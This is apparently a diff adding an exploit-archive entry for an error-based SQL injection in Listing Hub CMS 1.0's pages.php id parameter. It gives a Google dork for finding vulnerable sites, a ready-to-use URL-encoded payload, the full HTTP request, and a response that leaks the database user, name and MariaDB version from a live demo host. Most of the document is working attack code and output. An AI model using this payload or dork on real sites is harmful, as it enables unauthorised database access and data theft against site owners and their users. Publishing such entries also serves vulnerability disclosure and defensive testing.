@@ -1,0 +1,66 @@
+# Exploit Title: Listing Hub CMS 1.0 - 'pages.php id' SQL Injection
+# Google Dork: inurl:"pages.php?title=privacy-policy"
+# Date: 14 Feb 2019
+# Exploit Author: Deyaa Muhammad
+# Author EMail: contact [at] deyaa.me
+# Author Blog: http://deyaa.me
+# Vendor Homepage: https://themerig.com/
+# Software Link: https://codecanyon.net/item/listing-hub-cms-directory-listings-theme/21361294
+# Demo Website: https://listing-hub.themerig.com
+# Version: 1.0
+# Tested on: WIN7_x68/Linux
+# CVE : N/A
+
+# Description:
+----------------------
+Listing Hub CMS 1.0 suffers from a SQL Injection vulnerability.
+
+# POC:
+----------------------
+1. Access the following path https://[PATH]/pages.php?title=privacy-policy&id=2
+2. You can perform an " error-based" SQL Injection using the payload below
+2%27%20AND%20(SELECT%204588%20FROM(SELECT%20COUNT(*),CONCAT(0x3a3a,user(),0x3a3a,database(),0x3a3a,version(),0x3a3a,FLOOR(RAND(0)*2))x%20FROM%20INFORMATION_SCHEMA.PLUGINS%20GROUP%20BY%20x)a)--%20-
+
+# Request:
+----------------------
+GET /pages.php?id=2%27%20AND%20(SELECT%204588%20FROM(SELECT%20COUNT(*),CONCAT(0x3a3a,user(),0x3a3a,database(),0x3a3a,version(),0x3a3a,FLOOR(RAND(0)*2))x%20FROM%20INFORMATION_SCHEMA.PLUGINS%20GROUP%20BY%20x)a)--%20- HTTP/1.1
+Accept-Encoding: gzip, deflate
+Host: server
+Accept: */*
+Connection: close
+Cache-Control: no-cache
+
+
+# Response:
+----------------------
+HTTP/1.1 200 OK
+X-Powered-By: PHP/5.6.40
+Set-Cookie: PHPSESSID=icrk7uvmqmpsmb4ndt56me8564; path=/
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
+Pragma: no-cache
+Content-Type: text/html; charset=UTF-8
+Content-Length: 1149
+Vary: Accept-Encoding
+Date: Fri, 15 Feb 2019 06:16:21 GMT
+Accept-Ranges: bytes
+Server: LiteSpeed
+Alt-Svc: quic=":443"; ma=2592000; v="35,39,43"
+Connection: close
+
+<!DOCTYPE html>
+<!--[if lt IE 7]>      <html class="no-js lt-ie9 lt-ie8 lt-ie7" lang=""> <![endif]-->
+<!--[if IE 7]>         <html class="no-js lt-ie9 lt-ie8" lang=""> <![endif]-->
+<!--[if IE 8]>         <html class="no-js lt-ie9" lang=""> <![endif]-->
+<!--[if gt IE 8]><!-->
+<html class="no-js" lang="eng">
+	<head>
+	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+	<meta http-equiv="X-UA-Compatible" content="IE=edge">
+	<meta name="viewport" content="width=device-width, initial-scale=1.0">
+	<meta name="robots" content="index,follow"><br />
+<b>Notice</b>:  Undefined index: title in <b>/home2/otomati5/server/includes/head.php</b> on line <b>71</b><br />
+<br />
+<b>Warning</b>:  PDO::query(): SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '::otomati5_hub@localhost::otomati5_hub::10.1.37-MariaDB-cll-lve:' for key 'group_key' in <b>/home2/otomati5/listing-hub.themerig.com/includes/head.php</b> on line <b>75</b><br />
+<br />
+<b>Fatal error</b>:  Call to a member function fetch() on boolean in <b>/home2/otomati5/listing-hub.themerig.com/includes/head.php</b> on line <b>75</b><br />
